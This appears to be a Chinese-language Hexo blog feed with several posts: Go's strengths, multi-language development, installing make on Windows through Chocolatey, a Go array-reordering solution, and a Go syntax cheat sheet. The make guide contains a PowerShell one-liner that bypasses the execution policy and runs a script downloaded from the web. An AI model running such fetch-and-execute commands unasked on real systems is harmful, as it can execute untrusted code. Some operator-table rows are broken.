<p>另一方面，在错误处理上，它是相反的方式，无论是通过 Result monad ( <em>Rust</em> )，还是不允许你有未使用变量的令人讨厌的编译器 ( <em>Go</em> )，你 <strong>必须</strong> 默认处理它，然后您可以选择忽略它。虽然这确实意味着您可能会有更多的错误处理代码（可怕的 <code>if err != nil</code>），但这也意味着您的代码可能不太容易出错。</p>
<h1 id="绿色线程"><a href="#绿色线程" class="headerlink" title="绿色线程"></a>绿色线程</h1><p><em>Go</em> 最大的特性之一是 <em>goroutines</em>，这是绿色线程的别致名称。线程和绿色（或虚拟）线程之间的区别在于，绿色线程不直接针对操作系统运行，而是依赖于运行时。运行时然后在它认为合适的时候管理本机操作系统线程。</p>
<p>但是等等，这不是一件坏事吗？不一定，首先，你不依赖于操作系统的多线程能力，老实说，这在如今并不是一个大问题。</p>
<p>然而，一个很大的优势是，由于这些线程不需要在操作系统级别创建一个全新的线程，因此它们可以比真正的线程轻量级得多。这意味着您可以以与本机 OS 线程相同的启动成本有效地启动更多线程。</p>
<p>最后一个优点是，由于运行时本身正在管理线程，因此它可以轻松检测死锁和数据争用。Go提供了 <em>很好</em> 的工具。</p>
<h2 id="简单的线程同步"><a href="#简单的线程同步" class="headerlink" title="简单的线程同步"></a>简单的线程同步</h2><p>说到多线程，谈到多线程时最大的障碍之一就是同步。幸运的是， <em>Go</em> 提供了一些开箱即用的好工具。</p>
<ul>
<li>Channels：这是 <em>Go</em> 提供的线程之间通信和同步的最简单方法。您可以向频道发送消息，也可以从频道中读取消息。默认情况下，每次把一个 <em>goroutine</em> 写入一个通道时，它都会被阻塞，直到另一个 <em>goroutine</em> 从它读取，反之亦然。</li>
<li>WaitGroup：这个具有 3 个方法的结构体。<code>Add(i int)</code>, <code>Done()</code> 和 <code>Wait()</code>。您可以添加要等待的任务数，将任务标记为已完成，并等待所有任务完成。</li>
<li>Mutex、Semaphores 等：<code>sync</code> 标准库中的包下也提供了所有经典的同步模型。</li>
</ul>
<h1 id="综上所述"><a href="#综上所述" class="headerlink" title="综上所述"></a>综上所述</h1><p>即使我们这样说它，它也不全是完美无缺的。该语言存在一些缺点，例如缺少枚举，但所有这些缺点通常都很容易处理。例如要解决枚举，您可以自定义类型与 <code>iota</code>。</p>
<p>对于您可能遇到的几乎所有问题，已经有一个已知的解决方案，并且还有一个很棒的社区，其中包含可能需要的几乎所有内容的出色软件包。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F2ZWxpbm8vYXdlc29tZS1nbw==">https://github.com/avelino/awesome-go<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>所以是的，我们绝对是 <em>Go</em> 的忠实拥护者！</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>多语言开发啥时候成了常态化？</title>
    <url>/2022/12/multiple-program/</url>
    <content><![CDATA[<h2 id="多语言开发啥时候成了常态化？"><a href="#多语言开发啥时候成了常态化？" class="headerlink" title="多语言开发啥时候成了常态化？"></a>多语言开发啥时候成了常态化？</h2><p>这里说的多语言开发指的编程语言，不是语言包里面的多语言哈。</p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><span id="more"></span>

<p>曾几何起，IT行业的并没有那么内卷。那时候三青水秀，水光山色，大好三河。没有那么多人的算法打卡，没有什么终身学习，没有证书学历要求等。随着行业的逐渐发展，慢慢地都在追逐高精尖技术。也许这是事物发展的必然规律，优胜劣汰的自然发展。</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>我所接触的大多数程序员，他们所接触的编程语言，大多都超过了两个以上。这里面我谈一下编程理念的演化史：</p>
<ol>
<li>面向原生编程，最早一批的程序员，大多使用C&#x2F;C++等开发项目，他们采用的就是面向原生编程，采用原生态的代码开发自己的项目。</li>
<li>面向对象编程，网上有很多图片和言论来谈论过面向对象等，大多人接触的比较多，这一批程序员大多使用PHP&#x2F;JAVA开发项目。</li>
<li>面向框架编程，随着业务的增加，代码量越来越大，越来越难以维护。这时候就要使用框架来进行代码的梳理，进行行之有效的管理。也出现了一批优秀的框架。例如：JAVA的三大框架（SSH）赫赫有名，PHP也有三个框架（Laravel, YII, ThinkPHP）。那个时候很多人在纠结哪个好用。</li>
<li>面向开源编程，信息社会最大的资产就是数字，数字最大的价值就是用起来。所以为了避免信息孤岛，最大化数字资产的效益，开源软件如雨后春笋一样，茁壮成长。Maven、Npm、Composer等开元依赖包数不胜数。Golang更是直接把开源仓库拿过来用。创新和共享无疑已经成了新时代社会的符号。</li>
<li>面向服务编程，现代软件的的复杂度成倍的递增，功能模块也做的越来越细，为了分工合作，一起实现大型软件的开发，微服务理念应运而生。包括DevOps、GitOps等，是一组过程、方法与系统的统称。这时候为了更润滑细化的管理微服务，也出现了一批Docker、Docker-compose、Kubernetes等微服务管理软件。</li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最早没有架构的时候，网站项目开发只需要一小段页面代码就可以实现，为了展示自己的信息名片。后来随着业务的发展，人们对互联的要求变得越来越多，开始出现了脚本语言，数据存储等。这个时候已经开始出现多语言开发的情况，前后端需要一起开发，全栈的前奏。</p>
<p>后来出现了后端框架，到后来的前端Vue、React、Augular等，这个时候开始了前后端分离。各语言之间的契合度越来越高，语法和格式上变得大同小异。特别是框架的出现让开发人员在多语言开发之间变得更简便。但这也造成了对语言底层实现的了解不足，和解决问题不够深入。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>就目前IT行业来说，数据结构和算法仍然是基本功。框架封装了功能实现，开发变得简单，语言的差异性也变得模糊起来，代码也越来越臃肿。但总归利大于弊，框架对复杂业务流程的贡献功不可没。多语言的开发，依赖于框架和开源软件，开源的项目不可或缺！开源软件的蓬勃发展，使得多语言的开发简便起来。</p>
<p>单个语言深入的研究更多的是纵向发展，多语言开发更像是横向发展。单语言是形态，多语言是发展。要从语言的优劣性去考虑场景。做一专多能的T字型工程师。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>如何在 Windows 中安装和使用 make</title>
    <url>/2023/04/install-make-windows/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>make 是执行 Makefile 的命令行实用程序。此命令行工具受 Unix、Linux 和 Windows 操作系统支持。shell命令支持的编程语言可以使用make命令。它主要用于重新编译和重新链接一段代码，也用于维护库。</p>
<h2 id="如何在-Windows-上安装-make？"><a href="#如何在-Windows-上安装-make？" class="headerlink" title="如何在 Windows 上安装 make？"></a>如何在 Windows 上安装 make？</h2><span id="more"></span>

<p>在这篇博客中，我们将演示如何在 Windows 上安装、使用和卸载 make 命令。</p>
<p>本节将提供在 PowerShell 上使用 Chocolatey 包管理器安装 make 命令的最简单方法。</p>
<h2 id="第-1-步：打开-PowerShell-命令提示符"><a href="#第-1-步：打开-PowerShell-命令提示符" class="headerlink" title="第 1 步：打开 PowerShell 命令提示符"></a>第 1 步：打开 PowerShell 命令提示符</h2><p>首先，按 <code>Window + X</code> 键访问高级用户菜单并以管理员身份运行 Windows PowerShell 命令提示符。</p>
<h2 id="第-2-步：安装-Chocolatey-包管理器"><a href="#第-2-步：安装-Chocolatey-包管理器" class="headerlink" title="第 2 步：安装 Chocolatey 包管理器"></a>第 2 步：安装 Chocolatey 包管理器</h2><p>接下来，执行下面提供的 Chocolatey 包管理器安装命令：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">Set</span>-ExecutionPolicy Bypass -Scope Process -Force; [<span class="keyword">System</span>.Net.ServicePointManager]::SecurityProtocol = [<span class="keyword">System</span>.Net.ServicePointManager]::SecurityProtocol -bor <span class="number">3072</span>; iex ((<span class="built_in">New</span>-<span class="keyword">Object</span> <span class="keyword">System</span>.Net.WebClient).DownloadString(<span class="string">&#x27;https://community.chocolatey.org/install.ps1&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>该命令来源于：<span class="exturl" data-url="aHR0cHM6Ly9jaG9jb2xhdGV5Lm9yZy9pbnN0YWxsI2luZGl2aWR1YWw=">chocolatey 官网<i class="fa fa-external-link-alt"></i></span>.</p>
<p>通过运行 <code>choco</code> 命令确认 Chocolatey 包管理器的安装：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">choco</span></span><br></pre></td></tr></table></figure>

<p>给定的输出表明我们已经在 Windows 系统上成功安装了 Chocolatey 版本 <code>v1.1.0</code>。</p>
<h2 id="第-3-步：安装make"><a href="#第-3-步：安装make" class="headerlink" title="第 3 步：安装make"></a>第 3 步：安装make</h2><p>最后，在以下命令的帮助下使用 Chocolatey 安装 make 实用程序：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">choco install make</span></span><br></pre></td></tr></table></figure>

<h2 id="第-4-步：验证-make-版本"><a href="#第-4-步：验证-make-版本" class="headerlink" title="第 4 步：验证 make 版本"></a>第 4 步：验证 make 版本</h2><p>通过检查其版本来验证 make 实用程序安装：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">make --version</span></span><br></pre></td></tr></table></figure>

<p>可以看到我们已经在 Windows 上成功安装了 <code>GNU Make 4.3</code>。让我们继续使用它。</p>
<h2 id="如何在-Windows-上使用-make？"><a href="#如何在-Windows-上使用-make？" class="headerlink" title="如何在 Windows 上使用 make？"></a>如何在 Windows 上使用 make？</h2><p>make 命令的用途很多，但主要用于执行 Makefile 或描述文件。</p>
<p>想知道使用 make 命令运行 Makefile 的过程吗？查看下面给出的步骤。</p>
<h2 id="第-1-步：创建-Makefile"><a href="#第-1-步：创建-Makefile" class="headerlink" title="第 1 步：创建 Makefile"></a>第 1 步：创建 Makefile</h2><p>首先，我们将在我们的 <code>Myproject</code> 文件夹中创建一个名为 <code>Makefile</code> 的文本文件。</p>
<p>粘贴下面提供的代码来测试 make 命令的工作，然后按 <code>CTRL+S</code> 保存它：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">hello:</span></span><br><span class="line">    echo <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="第-2-步：删除-txt-扩展名"><a href="#第-2-步：删除-txt-扩展名" class="headerlink" title="第 2 步：删除 .txt 扩展名"></a>第 2 步：删除 .txt 扩展名</h2><p>在下一步中，从 Makefile 中删除 <code>.txt</code> 文件扩展名。为此，首先，选择菜单栏的 <code>查看</code> 选项并启用 <code>文件扩展名</code> 复选框。</p>
<p>然后，删除 <code>.txt</code> 扩展名。请记住，您只需要删除文件扩展名而无需更改文件名。这样做后，屏幕上会出现一个警告框，您必须从那里点击 <code>是</code> 按钮。</p>
<h2 id="第-3-步：运行-make-命令"><a href="#第-3-步：运行-make-命令" class="headerlink" title="第 3 步：运行 make 命令"></a>第 3 步：运行 make 命令</h2><p>之后，复制 <code>Makefile</code> 所在的路径。</p>
<p>在“启动”菜单中搜索 <code>CMD</code> 打开命令提示符，打开。</p>
<p>接下来，移动到保存 Makefile 的文件夹。使用 <code>cd</code> 命令并粘贴我们在下面提供的命令中指定的复制路径。</p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">&gt; cd <span class="name">C</span>:\Users\Admistrator\Desktop\Myproject</span><br></pre></td></tr></table></figure>

<p>现在，在命令提示符下执行 <code>make</code> 命令编译 Makefile 代码：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">make</span></span><br></pre></td></tr></table></figure>

<p>可以看到我们使用make命令成功编译并执行了Makefile。</p>
<p>make 实用程序还支持许多可用于执行不同操作的选项。在make命令中指定 <code>-help</code> 选项可以查看其手册：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">make --help</span></span><br></pre></td></tr></table></figure>

<p>让我们继续从 Windows 中卸载 make 实用程序的方法。</p>
<h2 id="如何从-Windows-卸载-make？"><a href="#如何从-Windows-卸载-make？" class="headerlink" title="如何从 Windows 卸载 make？"></a>如何从 Windows 卸载 make？</h2><p>可以使用 choco 命令从 Windows 系统中卸载 make 实用程序：</p>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">choco uninstall make</span></span><br></pre></td></tr></table></figure>

<p>我们已经有效地阐述了在 Windows 上安装、使用和卸载 make 实用程序的方法。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在 Windows 上安装 make 命令实用程序的最简单方法之一是在 PowerShell 上使用 <code>Chocolatey</code> 包管理器。为此，首先，打开 Windows PowerShell 并安装 Chocolatey 程序包管理器。之后，使用 <code>choco install make</code> 命令安装 make 实用程序。</p>
<p>这篇博客讲解了 make 在 Windows 上的安装、使用和卸载相关的方法。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>重新排序数组(Reorder An Array)</title>
    <url>/2023/07/record-an-array/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>给定两个整数数组 x 和 y。 根据这些规则创建一个数组：</p>
<ul>
<li>最初，新数组 arr 是空的。</li>
<li>从左到右读取 x[i] 和 y[i]，将值 x[i] 插入到 arr 中的索引 y[i] 处。</li>
<li>重复上一步，直到所有的 x 和 y 都被使用。</li>
<li>返回 arr。</li>
</ul>
<span id="more"></span>

<h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><blockquote>
<p>无需检查 y 的值是否有效。</p>
</blockquote>
<p>例子：</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">输入：x = <span class="string">[1,2,3,4,5]</span>, y = <span class="string">[0,1,2,2,1]</span></span><br><span class="line">输出：<span class="string">[1,5,2,4,3]</span></span><br></pre></td></tr></table></figure>

<p>解释：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">坐标系</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="selector-attr">[1]</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span> <span class="selector-attr">[1,2]</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="selector-attr">[1,2,3]</span></span><br><span class="line"><span class="number">4</span> <span class="number">2</span> <span class="selector-attr">[1,2,4,3]</span></span><br><span class="line"><span class="number">5</span> <span class="number">1</span> <span class="selector-attr">[1,5,2,4,3]</span></span><br></pre></td></tr></table></figure>

<p>约束：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &lt;= x<span class="selector-class">.length</span>, y<span class="selector-class">.length</span> &lt;= <span class="number">100</span></span><br><span class="line">x<span class="selector-class">.length</span> == y<span class="selector-class">.length</span></span><br><span class="line"><span class="number">0</span> &lt;= x<span class="selector-attr">[i]</span> &lt;= <span class="number">100</span></span><br><span class="line"><span class="number">0</span> &lt;= y<span class="selector-attr">[i]</span> &lt;= i</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">solution</span><span class="params">(x []<span class="type">int</span>, y []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	res := []<span class="type">int</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> x &#123;</span><br><span class="line">		<span class="keyword">if</span> y[k] &gt;= k &#123;</span><br><span class="line">			res = <span class="built_in">append</span>(res, v)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			res = <span class="built_in">append</span>(res[:y[k]], <span class="built_in">append</span>([]<span class="type">int</span>&#123;v&#125;, res[y[k]:]...)...)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 1, 5, 2, 4, 3</span></span><br><span class="line">	recorder := solution([]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;)</span><br><span class="line">	fmt.Println(recorder)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>Golang语法、技巧和窍门</title>
    <url>/2023/10/golang-cheat-sheet/</url>
    <content><![CDATA[<h2 id="Golang简介"><a href="#Golang简介" class="headerlink" title="Golang简介"></a>Golang简介</h2><ul>
<li>命令式语言</li>
<li>静态类型</li>
<li>语法标记类似于C（但括号较少且没有分号），结构类似Oberon-2</li>
<li>编译为本机代码（没有JVM）</li>
<li>没有类，但有带有方法的结构</li>
<li>接口</li>
<li>没有实现继承。不过有<span class="exturl" data-url="aHR0cHM6Ly9nb2xhbmcub3JnL2RvYy9lZmZlY3RpdmVfZ28uaHRtbCNlbWJlZGRpbmc=">type嵌入<i class="fa fa-external-link-alt"></i></span>。</li>
<li>函数是一等公民</li>
<li>函数可以返回多个值</li>
<li>支持闭包</li>
<li>指针，但没有指针算术</li>
<li>内置并发原语：Goroutines和Channels</li>
</ul>
<span id="more"></span>

<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="你好，世界"><a href="#你好，世界" class="headerlink" title="你好，世界"></a>你好，世界</h3><p>文件 <code>hello.go</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello Go&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">$ <span class="keyword">go</span> run hello.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+</code></td>
<td align="left">加法</td>
</tr>
<tr>
<td align="left"><code>-</code></td>
<td align="left">减法</td>
</tr>
<tr>
<td align="left"><code>*</code></td>
<td align="left">乘法</td>
</tr>
<tr>
<td align="left"><code>/</code></td>
<td align="left">除法</td>
</tr>
<tr>
<td align="left"><code>%</code></td>
<td align="left">取余</td>
</tr>
<tr>
<td align="left"><code>&amp;</code></td>
<td align="left">位与</td>
</tr>
<tr>
<td align="left">&#96;</td>
<td align="left">&#96;</td>
</tr>
<tr>
<td align="left"><code>^</code></td>
<td align="left">位异或</td>
</tr>
<tr>
<td align="left"><code>&amp;^</code></td>
<td align="left">位清除（非）</td>
</tr>
<tr>
<td align="left"><code>&lt;&lt;</code></td>
<td align="left">左移</td>
</tr>
<tr>
<td align="left"><code>&gt;&gt;</code></td>
<td align="left">右移</td>
</tr>
</tbody></table>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>==</code></td>
<td align="left">等于</td>
</tr>
<tr>
<td align="left"><code>!=</code></td>
<td align="left">不等于</td>
</tr>
<tr>
<td align="left"><code>&lt;</code></td>
<td align="left">小于</td>
</tr>
<tr>
<td align="left"><code>&lt;=</code></td>
<td align="left">小于等于</td>
</tr>
<tr>
<td align="left"><code>&gt;</code></td>
<td align="left">大于</td>
</tr>
<tr>
<td align="left"><code>&gt;=</code></td>
<td align="left">大于等于</td>
</tr>
</tbody></table>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&amp;&amp;</code></td>
<td align="left">逻辑与</td>
</tr>
<tr>
<td align="left">&#96;</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>!</code></td>
<td align="left">逻辑非</td>
</tr>
</tbody></table>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&amp;</code></td>
<td align="left">取地址 &#x2F; 创建指针</td>
</tr>
<tr>
<td align="left"><code>*</code></td>
<td align="left">解引用指针</td>
</tr>
<tr>
<td align="left"><code>&lt;-</code></td>
<td align="left">发送 &#x2F; 接收操作符（见下面的‘通道’部分）</td>
</tr>
</tbody></table>
<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>类型在标识符之后！</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo <span class="type">int</span> <span class="comment">// declaration without initialization</span></span><br><span class="line"><span class="keyword">var</span> foo <span class="type">int</span> = <span class="number">42</span> <span class="comment">// declaration with initialization</span></span><br><span class="line"><span class="keyword">var</span> foo, bar <span class="type">int</span> = <span class="number">42</span>, <span class="number">1302</span> <span class="comment">// declare and init multiple vars at once</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">42</span> <span class="comment">// type omitted, will be inferred</span></span><br><span class="line">foo := <span class="number">42</span> <span class="comment">// shorthand, only in func bodies, omit var keyword, type is always implicit</span></span><br><span class="line"><span class="keyword">const</span> constant = <span class="string">&quot;This is a constant&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// iota can be used for incrementing numbers, starting from 0</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    _ = <span class="literal">iota</span></span><br><span class="line">    a</span><br><span class="line">    b</span><br><span class="line">    c = <span class="number">1</span> &lt;&lt; <span class="literal">iota</span></span><br><span class="line">    d</span><br><span class="line">)</span><br><span class="line">    fmt.Println(a, b) <span class="comment">// 1 2 (0 is skipped)</span></span><br><span class="line">    fmt.Println(c, d) <span class="comment">// 8 16 (2^3, 2^4)</span></span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a simple function</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">functionName</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function with parameters (again, types go after identifiers)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">functionName</span><span class="params">(param1 <span class="type">string</span>, param2 <span class="type">int</span>)</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// multiple parameters of the same type</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">functionName</span><span class="params">(param1, param2 <span class="type">int</span>)</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// return type declaration</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">functionName</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can return multiple values at once</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnMulti</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>, <span class="string">&quot;foobar&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x, str = returnMulti()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return multiple named results simply by return</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnMulti2</span><span class="params">()</span></span> (n <span class="type">int</span>, s <span class="type">string</span>) &#123;</span><br><span class="line">    n = <span class="number">42</span></span><br><span class="line">    s = <span class="string">&quot;foobar&quot;</span></span><br><span class="line">    <span class="comment">// n and s will be returned</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x, str = returnMulti2()</span><br></pre></td></tr></table></figure>

<h4 id="函数作为值和闭包"><a href="#函数作为值和闭包" class="headerlink" title="函数作为值和闭包"></a>函数作为值和闭包</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// assign a function to a name</span></span><br><span class="line">    add := <span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// use the name to call the function</span></span><br><span class="line">    fmt.Println(add(<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Closures, lexically scoped: Functions can access values that were</span></span><br><span class="line"><span class="comment">// in scope when defining the function</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">scope</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span>&#123;</span><br><span class="line">    outer_var := <span class="number">2</span></span><br><span class="line">    foo := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> outer_var&#125;</span><br><span class="line">    <span class="keyword">return</span> foo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">another_scope</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span>&#123;</span><br><span class="line">    <span class="comment">// won&#x27;t compile because outer_var and foo not defined in this scope</span></span><br><span class="line">    outer_var = <span class="number">444</span></span><br><span class="line">    <span class="keyword">return</span> foo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Closures</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">outer</span><span class="params">()</span></span> (<span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    outer_var := <span class="number">2</span></span><br><span class="line">    inner := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        outer_var += <span class="number">99</span> <span class="comment">// outer_var from outer scope is mutated.</span></span><br><span class="line">        <span class="keyword">return</span> outer_var</span><br><span class="line">    &#125;</span><br><span class="line">    inner()</span><br><span class="line">    <span class="keyword">return</span> inner, outer_var <span class="comment">// return inner func and mutated outer_var 101</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="可变参数函数"><a href="#可变参数函数" class="headerlink" title="可变参数函数"></a>可变参数函数</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(adder(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)) 	<span class="comment">// 6</span></span><br><span class="line">	fmt.Println(adder(<span class="number">9</span>, <span class="number">9</span>))	<span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line">	nums := []<span class="type">int</span>&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line">	fmt.Println(adder(nums...))	<span class="comment">// 60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// By using ... before the type name of the last parameter you can indicate that it takes zero or more of those parameters.</span></span><br><span class="line"><span class="comment">// The function is invoked like any other function except we can pass as many arguments as we want.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">(args ...<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	total := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> args &#123; <span class="comment">// Iterates over the arguments whatever the number.</span></span><br><span class="line">		total += v</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> total</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

